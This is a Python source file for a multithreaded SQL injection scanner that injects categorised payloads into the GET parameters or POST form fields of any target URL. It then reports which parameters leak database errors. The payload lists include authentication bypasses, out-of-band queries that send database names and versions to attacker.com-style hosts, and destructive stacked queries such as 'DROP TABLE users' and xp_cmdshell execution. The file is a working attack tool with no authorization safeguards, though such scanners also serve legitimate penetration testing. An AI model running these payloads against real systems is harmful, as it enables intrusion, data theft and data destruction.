import random
import time
import re
import os
import json
import argparse
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

# Organized payloads by category for better targeting
PAYLOAD_CATEGORIES = {
    "basic": [
        "'", "\"", "''", "`", "';", "\";", "'--", "\"--", "'/*", "\"/*"
    ],
    "authentication_bypass": [
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1'/*",
        "admin' --", "admin' #", "admin'/*", "') OR ('1'='1", "') OR '1'='1"
    ],
    "time_based": [
        "' OR SLEEP(5)--", "\" OR SLEEP(5)--", "' OR pg_sleep(5)--",
        "' OR '1'='1' AND SLEEP(5)--", "' waitfor delay '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--", "' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ],
    "union_based": [
        "' union select null--", "' union select null,null--",
        "' union select user()--", "' union select version()--",
        "' union select table_name from information_schema.tables--",
        "' union all select @@version--"
    ],
    "error_based": [
        "' and 1=convert(int,'a')--", "' AND extractvalue(1, concat(0x7e, version()))--",
        "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))a FROM information_schema.tables LIMIT 0,1),8446744073709551610,8446744073709551610)))) --",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
    ],
    "boolean_based": [
        "' AND 1=1--", "' AND 1=2--", "' AND ASCII(SUBSTRING((SELECT version()),1,1))=52--",
        "' AND IF(1=1,sleep(0),sleep(5))--", "' AND IF(1=2,sleep(0),sleep(5))--"
    ],
    "out_of_band": [
        "' UNION ALL SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\\\foo'))-- ",
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attackerdomain.com\\\\'))-- "
    ],
    "stacked_queries": [
        "'; INSERT INTO users VALUES ('hacked', 'hacked')--",
        "'; DROP TABLE users--",
        "'; exec master..xp_cmdshell 'ping 127.0.0.1'--"
    ]
}

# Consolidated list of SQL errors to detect across different database systems
SQL_ERRORS = {
    "mysql": [
        "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", 
        "MySqlClient\.", "com\.mysql\.jdbc", "Unclosed quotation mark after the character string",
        "You have an error in your SQL syntax"
    ],
    "postgresql": [
        "PostgreSQL.*ERROR", "Warning.*\Wpg_.*", "valid PostgreSQL result", 
        "Npgsql\.", "PG::SyntaxError:", "org\.postgresql\.util"
    ],
    "microsoft": [
        "Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server", 
        "(\W|\A)SQL Server.*Driver", "Warning.*mssql_.*", 
        "(\W|\A)SQL Server.*[0-9a-fA-F]{8}", "(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        "(?s)Exception.*\WRoadhouse\.Cms\."
    ],
    "oracle": [
        "\bORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver", 
        "Warning.*\Woci_.*", "Warning.*\Wora_.*"
    ],
    "sqlite": [
        "SQLite/JDBCDriver", "SQLite\.Exception", "System\.Data\.SQLite\.SQLiteException", 
        "Warning.*sqlite_.*", "Warning.*SQLite3::", "[SQLITE_ERROR]"
    ],
    "ibm_db2": [
        "CLI Driver.*DB2", "DB2 SQL error", "Exception.*Db2.*"
    ],
    "general": [
        "Unclosed quotation mark", "SQL syntax.*error", "ODBC Driver",
        "unexpected end of SQL command", "SQL command not properly ended"
    ]
}

class SQLiScanner:
    def __init__(self, args):
        self.url = args.url
        self.method = args.method.upper()
        self.data = {}
        self.cookies = {}
        self.auth = None
        self.headers = {
            "User-Agent": "SQLiScanner/3.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "close"
        }
        
        if args.headers:
            try:
                custom_headers = json.loads(args.headers)
                self.headers.update(custom_headers)
            except json.JSONDecodeError:
                print(Fore.RED + "[!] Invalid JSON format for headers")
                
        self.proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.delay = args.delay
        self.timeout = args.timeout
        self.debug = args.debug
        self.threads = args.threads
        self.categories = args.categories.split(',') if args.categories else list(PAYLOAD_CATEGORIES.keys())
        self.output_format = args.output
        self.verify_ssl = not args.no_verify
        self.workers = min(args.threads, 20)  # Cap max workers
        
        # Load payloads
        self.payloads = []
        if args.payload_file:
            self.load_payloads_from_file(args.payload_file)
        else:
            self.load_default_payloads()
            
        # Handle POST data or auto-detect form fields
        if self.method == "POST":
            if args.data:
                try:
                    # Handle form-encoded data
                    if "=" in args.data:
                        self.data = dict(x.split("=") for x in args.data.split("&"))
                    # Handle JSON data
                    else:
                        try:
                            self.data = json.loads(args.data)
                            self.headers["Content-Type"] = "application/json"
                        except json.JSONDecodeError:
                            print(Fore.RED + "[!] Invalid JSON format for data")
                            exit(1)
                except:
                    print(Fore.RED + "[!] Invalid format for POST data")
                    exit(1)
            else:
                self.data = self.detect_form_fields()
                
        # Handle authentication
        if args.auth:
            try:
                username, password = args.auth.split(':')
                self.auth = (username, password)
            except:
                print(Fore.RED + "[!] Invalid authentication format. Use username:password")
                exit(1)
                
        # Handle cookies
        if args.cookies:
            try:
                self.cookies = dict(pair.split('=') for pair in args.cookies.split(';'))
            except:
                print(Fore.RED + "[!] Invalid cookies format. Use name=value;name2=value2")
                exit(1)
                
        # Scan results
        self.vulnerable_params = {}
        self.detected_dbms = set()
        self.start_time = None
        self.end_time = None
        
    def load_default_payloads(self):
        """Load payloads from the predefined categories."""
        for category in self.categories:
            if category in PAYLOAD_CATEGORIES:
                self.payloads.extend(PAYLOAD_CATEGORIES[category])
            else:
                print(Fore.YELLOW + f"[!] Warning: Unknown category '{category}'")
                
        print(Fore.BLUE + f"[*] Loaded {len(self.payloads)} payloads from {len(self.categories)} categories")
        
    def load_payloads_from_file(self, filename):
        """Load custom payloads from file."""
        try:
            with open(filename, "r") as f:
                self.payloads = [line.strip() for line in f if line.strip()]
            print(Fore.BLUE + f"[*] Loaded {len(self.payloads)} payloads from {filename}")
        except Exception as e:
            print(Fore.RED + f"[!] Failed to load payload file: {e}")
            print(Fore.YELLOW + "[*] Falling back to default payloads")
            self.load_default_payloads()
            
    def detect_form_fields(self):
        """Automatically detect form fields from the target URL."""
        try:
            print(Fore.BLUE + "[*] Detecting form fields...")
            response = self.make_request(self.url, "GET")
            if not response:
                return {}
                
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")
            
            if not forms:
                print(Fore.YELLOW + "[!] No forms detected on the page")
                return {}
                
            # If multiple forms, let user choose
            form = forms[0]
            if len(forms) > 1:
                print(Fore.CYAN + f"[*] Found {len(forms)} forms:")
                for i, f in enumerate(forms):
                    action = f.get("action", "")
                    method = f.get("method", "get").upper()
                    inputs = len(f.find_all("input"))
                    print(f"  {i+1}. Form: action='{action}', method='{method}', inputs={inputs}")
                    
                choice = input(Fore.MAGENTA + "[?] Select form number to test (default: 1): ")
                try:
                    form = forms[int(choice) - 1 if choice else 0]
                except:
                    print(Fore.YELLOW + "[!] Invalid choice, using first form")
                    
            # Extract form action if available
            action = form.get("action")
            if action:
                if action.startswith("http"):
                    self.url = action
                elif action.startswith("/"):
                    parsed = urlparse(self.url)
                    self.url = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    parsed = urlparse(self.url)
                    path = '/'.join(parsed.path.split('/')[:-1]) if '/' in parsed.path else ''
                    self.url = f"{parsed.scheme}://{parsed.netloc}{path}/{action}"
                    
            # Extract form method if available
            form_method = form.get("method", "").upper()
            if form_method in ["GET", "POST"]:
                self.method = form_method
                print(Fore.BLUE + f"[*] Using form method: {self.method}")
                
            # Extract form fields
            fields = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                    
                if inp.name == "select":
                    options = inp.find_all("option")
                    value = options[0].get("value", "") if options else ""
                else:
                    value = inp.get("value", "")
                    
                # Skip submit buttons and hidden fields with specific values
                input_type = inp.get("type", "").lower()
                if input_type in ["submit", "button", "image", "reset"]:
                    continue
                    
                fields[name] = value
                
            if fields:
                print(Fore.GREEN + f"[+] Detected {len(fields)} form fields: {', '.join(fields.keys())}")
            else:
                print(Fore.YELLOW + "[!] No usable form fields detected")
                
            return fields
            
        except Exception as e:
            print(Fore.RED + f"[!] Error detecting form fields: {e}")
            return {}
            
    def make_request(self, url, method, data=None, timeout=10):
        """Make an HTTP request with all configured options."""
        try:
            request_args = {
                "headers": self.headers,
                "proxies": self.proxy,
                "timeout": timeout,
                "verify": self.verify_ssl,
                "cookies": self.cookies or None,
                "auth": self.auth
            }
            
            if method == "GET":
                response = requests.get(url, **request_args)
            else:  # POST
                if data and isinstance(data, dict) and self.headers.get("Content-Type") == "application/json":
                    request_args["json"] = data
                else:
                    request_args["data"] = data
                response = requests.post(url, **request_args)
                
            return response
        except Exception as e:
            if self.debug:
                print(Fore.RED + f"[!] Request error: {e}")
            return None
            
    def is_vulnerable(self, response):
        """Check if a response indicates SQL injection vulnerability."""
        if not response:
            return False, None
            
        # Check HTTP error status codes
        if response.status_code >= 500:
            return True, "Server error response"
            
        # Check for SQL errors in response
        error_found = False
        dbms_type = None
        
        for dbms, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    error_found = True
                    dbms_type = dbms
                    self.detected_dbms.add(dbms)
                    break
            if error_found:
                break
                
        return error_found, dbms_type
        
    def test_payload(self, payload, param_name=None):
        """Test a single payload against the target."""
        results = []
        
        try:
            # For GET requests, modify each parameter one by one
            if self.method == "GET":
                parsed = urlparse(self.url)
                qs = parse_qs(parsed.query)
                
                # If no query parameters but param_name provided, add it
                if not qs and param_name:
                    qs = {param_name: [""]}
                    
                # Test each parameter
                for param in qs:
                    # Skip parameter if specific one requested
                    if param_name and param != param_name:
                        continue
                        
                    # Create modified query string with injected payload
                    modified_qs = qs.copy()
                    modified_qs[param] = [f"{modified_qs[param][0]}{payload}"]
                    
                    # Build new URL
                    new_query = urlencode(modified_qs, doseq=True)
                    target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    
                    # Make request and check for vulnerability
                    if self.debug:
                        print(Fore.CYAN + f"[DEBUG] Testing GET param '{param}' with payload: {payload}")
                        
                    response = self.make_request(target_url, "GET", timeout=self.timeout)
                    is_vuln, dbms = self.is_vulnerable(response)
                    
                    if is_vuln:
                        print(Fore.GREEN + f"[+] Parameter '{param}' vulnerable to payload: {payload}")
                        if dbms:
                            print(Fore.GREEN + f"    Detected DBMS: {dbms}")
                            
                        results.append({
                            "parameter": param,
                            "payload": payload,
                            "dbms": dbms,
                            "url": target_url
                        })
                    elif self.debug:
                        print(Fore.LIGHTBLACK_EX + f"[-] Parameter '{param}' not vulnerable to payload: {payload}")
                        
            # For POST requests, test each form field
            else:
                for field in self.data:
                    # Skip field if specific parameter requested
                    if param_name and field != param_name:
                        continue
                        
                    # Create modified form data with injected payload
                    test_data = self.data.copy()
                    original_value = test_data[field]
                    test_data[field] = f"{original_value}{payload}"
                    
                    # Make request and check for vulnerability
                    if self.debug:
                        print(Fore.CYAN + f"[DEBUG] Testing POST field '{field}' with payload: {payload}")
                        
                    response = self.make_request(self.url, "POST", test_data, self.timeout)
                    is_vuln, dbms = self.is_vulnerable(response)
                    
                    if is_vuln:
                        print(Fore.GREEN + f"[+] Field '{field}' vulnerable to payload: {payload}")
                        if dbms:
                            print(Fore.GREEN + f"    Detected DBMS: {dbms}")
                            
                        results.append({
                            "parameter": field,
                            "payload": payload,
                            "dbms": dbms,
                            "data": test_data
                        })
                    elif self.debug:
                        print(Fore.LIGHTBLACK_EX + f"[-] Field '{field}' not vulnerable to payload: {payload}")
                        
        except Exception as e:
            if self.debug:
                print(Fore.RED + f"[!] Error testing payload {payload}: {e}")
                
        # Add artificial delay between requests if specified
        if self.delay > 0:
            time.sleep(self.delay)
            
        return results
        
    def scan(self):
        """Execute the full scan with multiple threads."""
        self.start_time = time.time()
        total_payloads = len(self.payloads)
        
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + f"       ADVANCED SQL INJECTION SCANNER v3.0")
        print(Fore.CYAN + "=" * 60)
        print(Fore.BLUE + f"[*] Target URL: {self.url}")
        print(Fore.BLUE + f"[*] Method: {self.method}")
        print(Fore.BLUE + f"[*] Scanning with {total_payloads} payloads using {self.workers} threads")
        print(Fore.BLUE + f"[*] Selected categories: {', '.join(self.categories)}")
        print(Fore.CYAN + "-" * 60 + "\n")
        
        all_results = []
        
        # Test for parameters without query string
        parsed = urlparse(self.url)
        if not parsed.query and self.method == "GET":
            common_params = ["id", "page", "user", "username", "password", "query", "search", "category", "item"]
            print(Fore.YELLOW + "[!] No query parameters found in URL")
            
            if input(Fore.MAGENTA + "[?] Test common parameters? [Y/n]: ").lower() != "n":
                for param in common_params:
                    print(Fore.BLUE + f"[*] Testing common parameter: {param}")
                    
                    # Test a small subset of payloads for each parameter
                    for payload in random.sample(self.payloads, min(5, len(self.payloads))):
                        results = self.test_payload(payload, param)
                        all_results.extend(results)
                        
                        # If vulnerable, no need to test more payloads
                        if results:
                            break
        
        # Use thread pool for parallel execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = [executor.submit(self.test_payload, payload) for payload in self.payloads]
            
            completed = 0
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                
                # Update progress
                if not self.debug and completed % 5 == 0:
                    progress = (completed / total_payloads) * 100
                    print(f"\rProgress: {progress:.1f}% ({completed}/{total_payloads})", end="")
                    
                try:
                    results = future.result()
                    all_results.extend(results)
                    
                    # Update vulnerable parameters
                    for result in results:
                        param = result["parameter"]
                        if param not in self.vulnerable_params:
                            self.vulnerable_params[param] = []
                        self.vulnerable_params[param].append(result)
                except Exception as e:
                    if self.debug:
                        print(Fore.RED + f"\n[!] Error in thread: {e}")
                        
        # Clear the progress line
        if not self.debug:
            print("\r" + " " * 50 + "\r", end="")
            
        self.end_time = time.time()
        self.display_results()
        
        if self.output_format:
            self.export_results()
            
    def display_results(self):
        """Display scan results."""
        duration = self.end_time - self.start_time
        
        print("\n" + "=" * 60)
        print(Fore.CYAN + "              SCAN RESULTS SUMMARY")
        print("=" * 60)
        print(Fore.BLUE + f"[*] Scan completed in {duration:.2f} seconds")
        print(Fore.BLUE + f"[*] Tested {len(self.payloads)} payloads")
        
        if self.vulnerable_params:
            print(Fore.GREEN + f"\n[+] Found {len(self.vulnerable_params)} vulnerable parameters:")
            
            for param, results in self.vulnerable_params.items():
                print(Fore.GREEN + f"\n  - Parameter: {param}")
                print(Fore.GREEN + f"    Vulnerable to {len(results)} payloads")
                
                if self.detected_dbms:
                    print(Fore.GREEN + f"    Detected DBMS: {', '.join(self.detected_dbms)}")
                    
                print(Fore.YELLOW + "    Sample payloads:")
                for i, result in enumerate(results[:3]):  # Show only first 3 payloads
                    print(Fore.YELLOW + f"      {i+1}. {result['payload']}")
        else:
            print(Fore.YELLOW + "\n[-] No SQL injection vulnerabilities detected")
            
        print("\n" + "=" * 60)
        
    def export_results(self):
        """Export scan results to the specified format."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sqli_scan_{timestamp}"
        
        result_data = {
            "scan_info": {
                "target": self.url,
                "method": self.method,
                "timestamp": datetime.now().isoformat(),
                "duration_seconds": self.end_time - self.start_time,
                "payloads_tested": len(self.payloads),
                "categories_used": self.categories
            },
            "vulnerable_parameters": {}
        }
        
        # Format results
        for param, results in self.vulnerable_params.items():
            result_data["vulnerable_parameters"][param] = []
            for result in results:
                result_data["vulnerable_parameters"][param].append({
                    "payload": result["payload"],
                    "dbms": result.get("dbms"),
                    "request_details": result.get("url") if "url" in result else result.get("data")
                })
                
        # Export based on format
        if self.output_format == "json":
            with open(f"{filename}.json", "w") as f:
                json.dump(result_data, f, indent=2)
            print(Fore.GREEN + f"[+] Results exported to {filename}.json")
            
        elif self.output_format == "html":
            # Basic HTML report
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>SQL Injection Scan Report</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; }}
                    h1, h2, h3 {{ color: #2c3e50; }}
                    .container {{ max-width: 900px; margin: 0 auto; }}
                    .header {{ background-color: #3498db; color: white; padding: 15px; border-radius: 5px; }}
                    .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
                    .vulnerable {{ background-color: #f8d7da; }}
                    .info {{ background-color: #d1ecf1; }}
                    .payload {{ font-family: monospace; background-color: #f8f9fa; padding: 5px; margin: 5px 0; }}
                    table {{ width: 100%; border-collapse: collapse; }}
                    th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                    th {{ background-color: #f2f2f2; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>SQL Injection Vulnerability Scan Report</h1>
                        <p>Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                    </div>
                    
                    <div class="section info">
                        <h2>Scan Information</h2>
                        <table>
                            <tr><th>Target URL</th><td>{self.url}</td></tr>
                            <tr><th>Method</th><td>{self.method}</td></tr>
                            <tr><th>Duration</th><td>{result_data["scan_info"]["duration_seconds"]:.2f} seconds</td></tr>
                            <tr><th>Payloads Tested</th><td>{len(self.payloads)}</td></tr>
                            <tr><th>Categories</th><td>{', '.join(self.categories)}</td></tr>
                            <tr><th>Detected DBMS</th><td>{', '.join(self.detected_dbms) if self.detected_dbms else 'None'}</td></tr>
                        </table>
                    </div>
            """
            
            if self.vulnerable_params:
                html_content += f"""
                    <div class="section vulnerable">
                        <h2>Vulnerable Parameters Found</h2>
                        <p>Total vulnerable parameters: {len(self.vulnerable_params)}</p>
                """
                
                for param, results in self.vulnerable_params.items():
                    html_content += f"""
                        <h3>Parameter: {param}</h3>
                        <p>Vulnerable to {len(results)} payloads</p>
                        <table>
                            <tr>
                                <th>#</th>
                                <th>Payload</th>
                                <th>DBMS</th>
                            </tr>
                    """
                    
                    for i, result in enumerate(results):
                        html_content += f"""
                            <tr>
                                <td>{i+1}</td>
                                <td class="payload">{result["payload"]}</td>
                                <td>{result.get("dbms", "Unknown")}</td>
                            </tr>
                        """
                        
                    html_content += """
                        </table>
                    """
                    
                html_content += """
                    </div>
                """
            else:
                html_content += """
                    <div class="section">
                        <h2>No vulnerabilities detected</h2>
                        <p>The target appears to be secure against the tested SQL injection techniques.</p>
                    </div>
                """
                
            html_content += """
                    <div class="section">
                        <h2>Recommendations</h2>
                        <ul>
                            <li>Use prepared statements or parameterized queries</li>
                            <li>Implement input validation and sanitization</li>
                            <li>Apply least privilege principle to database accounts</li>
                            <li>Consider using Web Application Firewalls (WAF)</li>
                            <li>Regularly update database software</li>
                        </ul>
                    </div>
                </div>
            </body>
            </html>
            """
            
            with open(f"{filename}.html", "w") as f:
                f.write(html_content)
            print(Fore.GREEN + f"[+] Results exported to {filename}.html")
            
        elif self.output_format == "txt":
            with open(f"{filename}.txt", "w") as f:
                f.write("SQL INJECTION SCAN REPORT\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {self.url}\n")
                f.write(f"Method: {self.method}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Duration: {self.end_time - self.start_time:.2f} seconds\n")
                f.write(f"Payloads tested: {len(self.payloads)}\n")
                f.write(f"Categories: {', '.join(self.categories)}\n\n")
                
                if self.detected_dbms:
                    f.write(f"Detected DBMS: {', '.join(self.detected_dbms)}\n\n")
                    
                if self.vulnerable_params:
                    f.write(f"VULNERABLE PARAMETERS: {len(self.vulnerable_params)}\n")
                    f.write("-" * 50 + "\n\n")
                    
                    for param, results in self.vulnerable_params.items():
                        f.write(f"Parameter: {param}\n")
                        f.write(f"Vulnerable to {len(results)} payloads\n\n")
                        
                        for i, result in enumerate(results):
                            f.write(f"Payload {i+1}: {result['payload']}\n")
                            if result.get('dbms'):
                                f.write(f"DBMS: {result['dbms']}\n")
                            if result.get('url'):
                                f.write(f"URL: {result['url']}\n")
                            elif result.get('data'):
                                f.write(f"POST Data: {result['data']}\n")
                            f.write("\n")
                        f.write("\n")
                else:
                    f.write("No vulnerabilities detected.\n")
                
                f.write("\nRECOMMENDATIONS:\n")
                f.write("-" * 50 + "\n")
                f.write("1. Use prepared statements or parameterized queries\n")
                f.write("2. Implement proper input validation\n")
                f.write("3. Apply least privilege principle to database accounts\n")
                f.write("4. Consider using a Web Application Firewall (WAF)\n")
                f.write("5. Regularly update database software\n")
            
            print(Fore.GREEN + f"[+] Results exported to {filename}.txt")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    
    # Required arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan")
    
    # Scan configuration
    parser.add_argument("-m", "--method", default="GET", 
                       choices=["GET", "POST"], help="HTTP method to use (default: GET)")
    parser.add_argument("-d", "--data", help="POST data (form-encoded or JSON)")
    parser.add_argument("-H", "--headers", help="Additional headers as JSON string")
    parser.add_argument("-c", "--cookies", help="Cookies as name=value pairs separated by semicolons")
    parser.add_argument("--auth", help="HTTP authentication credentials (username:password)")
    parser.add_argument("--categories", 
                       help="Comma-separated list of payload categories to use (default: all)")
    parser.add_argument("--payload-file", help="File containing custom payloads (one per line)")
    
    # Performance options
    parser.add_argument("--threads", type=int, default=10, 
                       help="Number of threads to use (default: 10)")
    parser.add_argument("--delay", type=float, default=0, 
                       help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--timeout", type=int, default=10, 
                       help="Request timeout in seconds (default: 10)")
    
    # Output options
    parser.add_argument("-o", "--output", choices=["json", "html", "txt"], 
                       help="Export scan results to file")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    
    # Connection options
    parser.add_argument("--proxy", help="Proxy server (e.g., http://localhost:8080)")
    parser.add_argument("--no-verify", action="store_true", 
                       help="Disable SSL certificate verification")
    
    return parser.parse_args()

def main():
    """Main function to run the scanner."""
    try:
        args = parse_arguments()
        scanner = SQLiScanner(args)
        scanner.scan()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user")
        exit(1)
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        exit(1)

if __name__ == "__main__":
    main()
